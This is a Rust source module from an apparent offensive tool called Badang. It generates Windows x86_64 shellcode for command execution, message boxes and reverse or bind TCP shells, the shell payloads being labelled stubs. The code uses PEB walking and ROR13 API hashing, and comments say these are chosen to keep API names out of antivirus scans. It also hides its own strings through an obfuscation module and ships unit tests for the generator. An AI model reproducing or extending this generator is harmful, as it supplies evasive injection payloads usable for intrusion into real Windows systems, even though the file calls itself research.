// Badang — Built-in Payload Generator
// Generates x86_64 Windows shellcode without external tools.
// Each payload is position-independent code using PEB walking.

use crate::log::LogSink;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum PayloadType {
    Nop,
    Exec,
    MessageBox,
    ReverseTcp,
    BindTcp,
}

impl PayloadType {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "nop" | "test" => Some(Self::Nop),
            "exec" | "winexec" => Some(Self::Exec),
            "messagebox" | "msgbox" | "msg" => Some(Self::MessageBox),
            "reverse_tcp" | "reversetcp" | "reverse" | "rev" => Some(Self::ReverseTcp),
            "bind_tcp" | "bindtcp" | "bind" => Some(Self::BindTcp),
            _ => None,
        }
    }

    pub fn name(&self) -> &str {
        match self {
            Self::Nop => "NOP Test (safe return)",
            Self::Exec => "Exec (WinExec)",
            Self::MessageBox => "MessageBox",
            Self::ReverseTcp => "Reverse TCP Shell",
            Self::BindTcp => "Bind TCP Shell",
        }
    }

    pub fn description(&self) -> &str {
        match self {
            Self::Nop => "Does nothing and returns — test that injection works without crashing",
            Self::Exec => "Run a command via WinExec (e.g. calc.exe)",
            Self::MessageBox => "Show a MessageBox popup (harmless PoC)",
            Self::ReverseTcp => "Reverse shell — connect back to IP:PORT, spawn cmd.exe",
            Self::BindTcp => "Bind shell — listen on PORT, spawn cmd.exe on connect",
        }
    }

    pub fn all() -> &'static [PayloadType] {
        &[
            Self::Nop,
            Self::Exec,
            Self::MessageBox,
            Self::ReverseTcp,
            Self::BindTcp,
        ]
    }
}

#[derive(Debug, Clone)]
pub struct PayloadConfig {
    pub payload_type: PayloadType,
    pub command: String,
    pub title: String,
    pub text: String,
    pub lhost: String,
    pub lport: u16,
}

impl Default for PayloadConfig {
    fn default() -> Self {
        Self {
            payload_type: PayloadType::Exec,
            command: String::from("calc.exe"),
            title: String::from("Badang"),
            text: String::from("Hello from Badang"),
            lhost: String::from("127.0.0.1"),
            lport: 4444,
        }
    }
}

pub fn generate(config: &PayloadConfig) -> Result<Vec<u8>, String> {
    validate_config(config)?;
    match config.payload_type {
        PayloadType::Nop => Ok(generate_nop()),
        PayloadType::Exec => generate_exec(&config.command),
        PayloadType::MessageBox => generate_messagebox(&config.title, &config.text),
        PayloadType::ReverseTcp => generate_reverse_tcp(&config.lhost, config.lport),
        PayloadType::BindTcp => generate_bind_tcp(config.lport),
    }
}

fn validate_config(config: &PayloadConfig) -> Result<(), String> {
    match config.payload_type {
        PayloadType::Nop => {}
        PayloadType::Exec => {
            if config.command.trim().is_empty() {
                return Err("command is empty".to_string());
            }
            if config.command.len() > MAX_STRING_LEN {
                return Err(format!(
                    "command too long ({} bytes, max {})",
                    config.command.len(),
                    MAX_STRING_LEN
                ));
            }
        }
        PayloadType::MessageBox => {
            if config.title.trim().is_empty() {
                return Err("title is empty".to_string());
            }
            if config.text.trim().is_empty() {
                return Err("text is empty".to_string());
            }
            if config.title.len() + config.text.len() > MAX_STRING_LEN {
                return Err(format!(
                    "title + text too long ({} bytes, max {})",
                    config.title.len() + config.text.len(),
                    MAX_STRING_LEN
                ));
            }
        }
        PayloadType::ReverseTcp => {
            parse_ipv4(&config.lhost)?;
            if config.lport == 0 {
                return Err("port must be 1-65535".to_string());
            }
        }
        PayloadType::BindTcp => {
            if config.lport == 0 {
                return Err("port must be 1-65535".to_string());
            }
        }
    }
    Ok(())
}

pub fn parse_ipv4(ip: &str) -> Result<[u8; 4], String> {
    let parts: Vec<&str> = ip.split('.').collect();
    if parts.len() != 4 {
        return Err(format!("invalid IPv4 address '{}' — need 4 octets", ip));
    }
    let mut octets = [0u8; 4];
    for (i, part) in parts.iter().enumerate() {
        octets[i] = part
            .parse::<u8>()
            .map_err(|_| format!("invalid octet '{}' in IP address", part))?;
    }
    Ok(octets)
}

pub fn encode_port(port: u16) -> [u8; 2] {
    port.to_be_bytes()
}

const MAX_STRING_LEN: usize = 200;

// ============================================================================
// NOP test payload: just return 0 from the thread
// xor eax,eax ; ret
// ============================================================================
fn generate_nop() -> Vec<u8> {
    vec![
        0x31, 0xC0, // xor eax, eax  (return 0)
        0xC3,       // ret
    ]
}

// ============================================================================
// Template: Exec (WinExec)
//
// x86_64 PIC shellcode that:
//   1. Finds kernel32.dll via PEB walking (gs:[0x60] → PEB → Ldr → module list)
//   2. Walks kernel32's export table to find WinExec by hash
//   3. Calls WinExec(command, SW_SHOW)
//   4. Returns cleanly (thread runtime handles exit)
//
// API hashing: simple ROR13-additive hash used to identify function names
// without embedding cleartext strings for the APIs themselves.
//
// The command string is appended after the code — the shellcode uses a
// call/pop trick to get a RIP-relative pointer to the data section.
// ============================================================================

// ROR13 hash of "WinExec"
const HASH_WINEXEC: u32 = 0x0E8AFE98;
// ROR13 hash of "ExitThread"
const HASH_EXIT_THREAD: u32 = 0x60E0CEEF;

fn ror13_hash(name: &[u8]) -> u32 {
    let mut h: u32 = 0;
    for &b in name {
        h = h.rotate_right(13).wrapping_add(b as u32);
    }
    h
}

// ============================================================================
// Shared subroutines and assembler
//
// All payloads share the same find_function and get_data_ptr subroutines.
// The assemble() helper appends them after the main code and patches all
// relative call offsets automatically — no manual offset math needed.
// ============================================================================

const HASH_LOADLIBRARYA: u32 = 0xEC0E4E8E;
const HASH_MESSAGEBOXA: u32 = 0xBC4DA2A8;
const HASH_CREATEPROCESSA: u32 = 0x16B3FE72;

fn data_marker() -> [u8; 8] {
    crate::obf::ba(&crate::obf::E_DATA_MARKER)
}

// find_function: resolve an API by ROR13 hash from a module's export table.
// Input:  ecx = NumberOfNames, rdx = AddressOfNames VA,
//         r11d = target hash, rbp = module base, rbx = export dir VA
// Output: rax = function VA
// 65 bytes; all internal jumps are position-independent.
// rdx is saved/restored around the hash loop (movzx edx clobbers it).
fn sub_find_function() -> Vec<u8> {
    crate::obf::b(&crate::obf::E_SUB_FIND_FUNCTION)
}

fn sub_get_data_ptr() -> Vec<u8> {
    crate::obf::b(&crate::obf::E_SUB_GET_DATA_PTR)
}

#[derive(Clone, Copy)]
enum CallTarget { FindFunction, GetDataPtr }

struct CallPatch {
    offset: usize,
    target: CallTarget,
}

fn assemble(main_code: &[u8], patches: &[CallPatch]) -> Vec<u8> {
    let sfn = sub_find_function();
    let sdp = sub_get_data_ptr();
    let dm = data_marker();
    let find_fn_start = main_code.len();
    let get_data_start = find_fn_start + sfn.len();

    let mut code = Vec::with_capacity(
        main_code.len() + sfn.len() + sdp.len() + dm.len(),
    );
    code.extend_from_slice(main_code);
    code.extend_from_slice(&sfn);
    code.extend_from_slice(&sdp);
    code.extend_from_slice(&dm);

    for patch in patches {
        let next_ip = patch.offset + 5;
        let target = match patch.target {
            CallTarget::FindFunction => find_fn_start,
            CallTarget::GetDataPtr => get_data_start,
        };
        let rel = (target as i32) - (next_ip as i32);
        let bytes = rel.to_le_bytes();
        code[patch.offset + 1] = bytes[0];
        code[patch.offset + 2] = bytes[1];
        code[patch.offset + 3] = bytes[2];
        code[patch.offset + 4] = bytes[3];
    }

    code
}

// ============================================================================
// Exec payload: WinExec(command, SW_SHOW) then return
// ============================================================================
const EXEC_MAX_CMD: usize = 260;

fn main_exec() -> Vec<u8> {
    crate::obf::b(&crate::obf::E_MAIN_EXEC)
}
// 95 bytes; patches at 65, 73

fn generate_exec(command: &str) -> Result<Vec<u8>, String> {
    let me = main_exec();
    let mut sc = assemble(&me, &[
        CallPatch { offset: 65, target: CallTarget::FindFunction },
        CallPatch { offset: 73, target: CallTarget::GetDataPtr },
    ]);
    let mut cmd_buf = vec![0u8; EXEC_MAX_CMD];
    let cmd_bytes = command.as_bytes();
    cmd_buf[..cmd_bytes.len()].copy_from_slice(cmd_bytes);
    sc.extend_from_slice(&cmd_buf);
    Ok(sc)
}

// ============================================================================
// MessageBox payload: LoadLibraryA("user32") → MessageBoxA(0, text, title, 0)
//
// Data layout: [title 128][text 128]["user32.dll\0"]
// ============================================================================
const MSGBOX_TITLE_SIZE: usize = 128;
const MSGBOX_TEXT_SIZE: usize = 128;

fn main_msgbox() -> Vec<u8> {
    crate::obf::b(&crate::obf::E_MAIN_MSGBOX)
}
// 166 bytes; patches at 65, 73, 130

fn generate_messagebox(title: &str, text: &str) -> Result<Vec<u8>, String> {
    let mm = main_msgbox();
    let mut sc = assemble(&mm, &[
        CallPatch { offset: 65, target: CallTarget::FindFunction },
        CallPatch { offset: 73, target: CallTarget::GetDataPtr },
        CallPatch { offset: 130, target: CallTarget::FindFunction },
    ]);
    let mut title_buf = vec![0u8; MSGBOX_TITLE_SIZE];
    let mut text_buf = vec![0u8; MSGBOX_TEXT_SIZE];
    let tb = title.as_bytes();
    let xb = text.as_bytes();
    title_buf[..tb.len().min(MSGBOX_TITLE_SIZE - 1)]
        .copy_from_slice(&tb[..tb.len().min(MSGBOX_TITLE_SIZE - 1)]);
    text_buf[..xb.len().min(MSGBOX_TEXT_SIZE - 1)]
        .copy_from_slice(&xb[..xb.len().min(MSGBOX_TEXT_SIZE - 1)]);
    sc.extend_from_slice(&title_buf);
    sc.extend_from_slice(&text_buf);
    let u32dll = crate::obf::s(crate::obf::USER32);
    sc.extend_from_slice(u32dll.as_bytes());
    sc.push(0);
    Ok(sc)
}

// ============================================================================
// Reverse TCP Shell (stub — resolves APIs, exits cleanly)
//
// Data layout: [sockaddr_in 16 bytes]["ws2_32.dll\0"]["cmd.exe\0"]
// ============================================================================

fn main_shell_stub() -> Vec<u8> {
    crate::obf::b(&crate::obf::E_MAIN_SHELL_STUB)
}
// 103 bytes; patches at 65, 88

const REVTCP_FAMILY_OFFSET: usize = 0;
const REVTCP_PORT_OFFSET: usize = 2;
const REVTCP_IP_OFFSET: usize = 4;

fn generate_reverse_tcp(lhost: &str, lport: u16) -> Result<Vec<u8>, String> {
    let ip = parse_ipv4(lhost)?;
    let port = encode_port(lport);

    let ms = main_shell_stub();
    let mut sc = assemble(&ms, &[
        CallPatch { offset: 65, target: CallTarget::FindFunction },
        CallPatch { offset: 88, target: CallTarget::FindFunction },
    ]);
    let mut sockaddr = [0u8; 16];
    sockaddr[REVTCP_FAMILY_OFFSET] = 0x02;
    sockaddr[REVTCP_PORT_OFFSET] = port[0];
    sockaddr[REVTCP_PORT_OFFSET + 1] = port[1];
    sockaddr[REVTCP_IP_OFFSET..REVTCP_IP_OFFSET + 4].copy_from_slice(&ip);

    sc.extend_from_slice(&sockaddr);
    let ws = crate::obf::s(crate::obf::WS2_32);
    sc.extend_from_slice(ws.as_bytes());
    sc.push(0);
    let cmd = crate::obf::s(crate::obf::CMD_EXE);
    sc.extend_from_slice(cmd.as_bytes());
    sc.push(0);
    Ok(sc)
}

// ============================================================================
// Bind TCP Shell (stub — resolves APIs, exits cleanly)
// ============================================================================

fn generate_bind_tcp(lport: u16) -> Result<Vec<u8>, String> {
    let port = encode_port(lport);

    let ms = main_shell_stub();
    let mut sc = assemble(&ms, &[
        CallPatch { offset: 65, target: CallTarget::FindFunction },
        CallPatch { offset: 88, target: CallTarget::FindFunction },
    ]);
    let mut sockaddr = [0u8; 16];
    sockaddr[0] = 0x02;
    sockaddr[2] = port[0];
    sockaddr[3] = port[1];

    sc.extend_from_slice(&sockaddr);
    let ws = crate::obf::s(crate::obf::WS2_32);
    sc.extend_from_slice(ws.as_bytes());
    sc.push(0);
    let cmd = crate::obf::s(crate::obf::CMD_EXE);
    sc.extend_from_slice(cmd.as_bytes());
    sc.push(0);
    Ok(sc)
}

// ---------------------------------------------------------------------------
// Educational info
// ---------------------------------------------------------------------------
pub fn print_info(log: &LogSink) {
    log.info("");
    log.info("=== Payload Generator ===");
    log.info("");
    log.info("Built-in shellcode generation — no msfvenom needed.");
    log.info("");
    log.info("Available payload types:");
    for t in PayloadType::all() {
        log.info(format!("  {} — {}", t.name(), t.description()));
    }
    log.info("");
    log.detail("How it works:");
    log.detail("  Each payload is x86_64 position-independent code (PIC) that:");
    log.detail("  1. Walks the PEB (Process Environment Block) to find kernel32.dll");
    log.detail("  2. Parses the PE export table to resolve API functions by hash");
    log.detail("  3. Calls the target API (WinExec, MessageBoxA, WSASocketA, etc.)");
    log.detail("  4. Returns cleanly (thread runtime handles exit)");
    log.info("");
    log.detail("PEB walking technique (x64):");
    log.detail("  gs:[0x60] → PEB → PEB_LDR_DATA → InMemoryOrderModuleList");
    log.detail("  Walk the linked list: exe → ntdll.dll → kernel32.dll");
    log.detail("  Read the DllBase field to get kernel32's base address");
    log.info("");
    log.detail("API hashing (ROR13):");
    log.detail("  Instead of storing API names as strings (which AV scans for),");
    log.detail("  each API name is pre-computed as a ROR13 hash.");
    log.detail("  The shellcode walks the export name table, hashes each name,");
    log.detail("  and compares against the target hash to find the function.");
    log.info("");
    log.warning("Detection considerations:");
    log.warning("  - PEB walking is a KNOWN shellcode technique");
    log.warning("  - EDRs detect the gs:[0x60] access pattern");
    log.warning("  - API hashing is widely recognized");
    log.warning("  - These payloads are for RESEARCH — not for bypassing modern EDR");
    log.info("");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ror13_known_hashes() {
        assert_eq!(ror13_hash(b"WinExec"), HASH_WINEXEC);
        assert_eq!(ror13_hash(b"ExitThread"), HASH_EXIT_THREAD);
        assert_eq!(ror13_hash(b"LoadLibraryA"), HASH_LOADLIBRARYA);
        assert_eq!(ror13_hash(b"MessageBoxA"), HASH_MESSAGEBOXA);
        assert_eq!(ror13_hash(b"CreateProcessA"), HASH_CREATEPROCESSA);
    }

    #[test]
    fn test_parse_ipv4_valid() {
        assert_eq!(parse_ipv4("192.168.1.10").unwrap(), [192, 168, 1, 10]);
        assert_eq!(parse_ipv4("127.0.0.1").unwrap(), [127, 0, 0, 1]);
        assert_eq!(parse_ipv4("0.0.0.0").unwrap(), [0, 0, 0, 0]);
        assert_eq!(parse_ipv4("255.255.255.255").unwrap(), [255, 255, 255, 255]);
    }

    #[test]
    fn test_parse_ipv4_invalid() {
        assert!(parse_ipv4("999.1.1.1").is_err());
        assert!(parse_ipv4("1.2.3").is_err());
        assert!(parse_ipv4("").is_err());
        assert!(parse_ipv4("abc.def.ghi.jkl").is_err());
    }

    #[test]
    fn test_encode_port() {
        assert_eq!(encode_port(4444), [0x11, 0x5C]);
        assert_eq!(encode_port(80), [0x00, 0x50]);
        assert_eq!(encode_port(443), [0x01, 0xBB]);
        assert_eq!(encode_port(8080), [0x1F, 0x90]);
    }

    #[test]
    fn test_validate_exec_empty() {
        let config = PayloadConfig {
            payload_type: PayloadType::Exec,
            command: String::new(),
            ..Default::default()
        };
        assert!(validate_config(&config).is_err());
    }

    #[test]
    fn test_validate_exec_too_long() {
        let config = PayloadConfig {
            payload_type: PayloadType::Exec,
            command: "x".repeat(300),
            ..Default::default()
        };
        assert!(validate_config(&config).is_err());
    }

    #[test]
    fn test_validate_msgbox_empty_title() {
        let config = PayloadConfig {
            payload_type: PayloadType::MessageBox,
            title: String::new(),
            text: "hello".to_string(),
            ..Default::default()
        };
        assert!(validate_config(&config).is_err());
    }

    #[test]
    fn test_validate_reverse_tcp_bad_ip() {
        let config = PayloadConfig {
            payload_type: PayloadType::ReverseTcp,
            lhost: "999.1.1.1".to_string(),
            lport: 4444,
            ..Default::default()
        };
        assert!(validate_config(&config).is_err());
    }

    #[test]
    fn test_validate_port_zero() {
        let config = PayloadConfig {
            payload_type: PayloadType::BindTcp,
            lport: 0,
            ..Default::default()
        };
        assert!(validate_config(&config).is_err());
    }

    #[test]
    fn test_generate_exec_produces_bytes() {
        let config = PayloadConfig {
            payload_type: PayloadType::Exec,
            command: "calc.exe".to_string(),
            ..Default::default()
        };
        let bytes = generate(&config).unwrap();
        assert!(!bytes.is_empty());
        assert!(bytes.len() > 100);
    }

    #[test]
    fn test_generate_exec_contains_command() {
        let config = PayloadConfig {
            payload_type: PayloadType::Exec,
            command: "calc.exe".to_string(),
            ..Default::default()
        };
        let bytes = generate(&config).unwrap();
        assert!(bytes.windows(8).any(|w| w == b"calc.exe"));
    }

    #[test]
    fn test_generate_exec_different_commands_differ() {
        let a = generate(&PayloadConfig {
            command: "calc.exe".to_string(),
            ..Default::default()
        })
        .unwrap();
        let b = generate(&PayloadConfig {
            command: "notepad.exe".to_string(),
            ..Default::default()
        })
        .unwrap();
        assert_ne!(a, b);
    }

    #[test]
    fn test_generate_messagebox_contains_strings() {
        let config = PayloadConfig {
            payload_type: PayloadType::MessageBox,
            title: "TestTitle".to_string(),
            text: "TestText".to_string(),
            ..Default::default()
        };
        let bytes = generate(&config).unwrap();
        assert!(bytes.windows(9).any(|w| w == b"TestTitle"));
        assert!(bytes.windows(8).any(|w| w == b"TestText"));
        assert!(bytes.windows(10).any(|w| w == b"user32.dll"));
    }

    #[test]
    fn test_generate_reverse_tcp_contains_ip_and_port() {
        let config = PayloadConfig {
            payload_type: PayloadType::ReverseTcp,
            lhost: "192.168.1.10".to_string(),
            lport: 4444,
            ..Default::default()
        };
        let bytes = generate(&config).unwrap();
        // IP bytes should appear in the data section
        assert!(bytes.windows(4).any(|w| w == [192, 168, 1, 10]));
        // Port in big-endian
        assert!(bytes.windows(2).any(|w| w == [0x11, 0x5C]));
    }

    #[test]
    fn test_generate_bind_tcp_contains_port() {
        let config = PayloadConfig {
            payload_type: PayloadType::BindTcp,
            lport: 8080,
            ..Default::default()
        };
        let bytes = generate(&config).unwrap();
        assert!(bytes.windows(2).any(|w| w == [0x1F, 0x90]));
        assert!(bytes.windows(7).any(|w| w == b"cmd.exe"));
    }

    #[test]
    fn test_generate_all_types_succeed() {
        for &t in PayloadType::all() {
            let config = PayloadConfig {
                payload_type: t,
                ..Default::default()
            };
            let result = generate(&config);
            assert!(
                result.is_ok(),
                "Failed for type {:?}: {:?}",
                t,
                result.err()
            );
        }
    }

    #[test]
    fn test_payload_type_from_str() {
        assert_eq!(PayloadType::from_str("exec"), Some(PayloadType::Exec));
        assert_eq!(
            PayloadType::from_str("messagebox"),
            Some(PayloadType::MessageBox)
        );
        assert_eq!(
            PayloadType::from_str("msgbox"),
            Some(PayloadType::MessageBox)
        );
        assert_eq!(
            PayloadType::from_str("reverse_tcp"),
            Some(PayloadType::ReverseTcp)
        );
        assert_eq!(PayloadType::from_str("rev"), Some(PayloadType::ReverseTcp));
        assert_eq!(
            PayloadType::from_str("bind_tcp"),
            Some(PayloadType::BindTcp)
        );
        assert_eq!(PayloadType::from_str("bind"), Some(PayloadType::BindTcp));
        assert!(PayloadType::from_str("").is_none());
        assert!(PayloadType::from_str("unknown").is_none());
    }

    #[test]
    fn test_payload_type_name() {
        assert_eq!(PayloadType::Exec.name(), "Exec (WinExec)");
        assert_eq!(PayloadType::MessageBox.name(), "MessageBox");
        assert_eq!(PayloadType::ReverseTcp.name(), "Reverse TCP Shell");
        assert_eq!(PayloadType::BindTcp.name(), "Bind TCP Shell");
    }

    #[test]
    fn test_exec_starts_with_cld() {
        let bytes = generate(&PayloadConfig::default()).unwrap();
        assert_eq!(
            bytes[0], 0xFC,
            "shellcode should start with CLD instruction"
        );
    }

    #[test]
    fn test_generate_deterministic() {
        let config = PayloadConfig::default();
        let a = generate(&config).unwrap();
        let b = generate(&config).unwrap();
        assert_eq!(a, b, "same config should produce identical output");
    }

    #[test]
    fn test_data_marker_present_in_exec() {
        let sc = generate_exec("test").unwrap();
        let dm = data_marker();
        assert!(sc.windows(dm.len()).any(|w| w == dm));
    }

    #[test]
    fn test_assemble_patches_call_offsets() {
        let me = main_exec();
        let sc = assemble(&me, &[
            CallPatch { offset: 65, target: CallTarget::FindFunction },
            CallPatch { offset: 88, target: CallTarget::FindFunction },
            CallPatch { offset: 96, target: CallTarget::GetDataPtr },
        ]);
        let sfn = sub_find_function();
        let find_fn_start = me.len();
        let get_data_start = find_fn_start + sfn.len();

        let rel1 = i32::from_le_bytes([sc[66], sc[67], sc[68], sc[69]]);
        assert_eq!(rel1, (find_fn_start as i32) - 70);

        let rel2 = i32::from_le_bytes([sc[89], sc[90], sc[91], sc[92]]);
        assert_eq!(rel2, (find_fn_start as i32) - 93);

        let rel3 = i32::from_le_bytes([sc[97], sc[98], sc[99], sc[100]]);
        assert_eq!(rel3, (get_data_start as i32) - 101);
    }

    #[test]
    fn test_sub_find_function_size() {
        assert_eq!(sub_find_function().len(), 65);
    }

    #[test]
    fn test_sub_get_data_ptr_size() {
        assert_eq!(sub_get_data_ptr().len(), 11);
    }
}
